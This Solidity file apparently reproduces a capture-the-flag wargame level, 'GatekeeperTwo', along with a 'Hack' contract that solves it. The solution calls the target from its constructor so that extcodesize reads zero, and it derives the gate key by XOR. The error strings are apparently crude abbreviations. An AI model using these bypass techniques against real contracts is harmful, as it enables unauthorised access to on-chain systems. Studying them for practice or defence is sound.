// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin,"bsdk");
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0,"bc");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max ,"mc");
    _;
  }


  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }

}



// extcodesize only returns the correct value once the contract is constructed. 
// While the constructor of our contract is executing it’ll return zero

// a ^ b == c
// a ^ c == b
contract Hack
{
    
    constructor(address i)
    {
        GatekeeperTwo j;
        j = GatekeeperTwo(i);
        uint64 _gateKey = ( uint64(bytes8(keccak256(abi.encodePacked(this))))  ) ^ ( type(uint64).max);
        j.enter(bytes8(_gateKey));
    }
}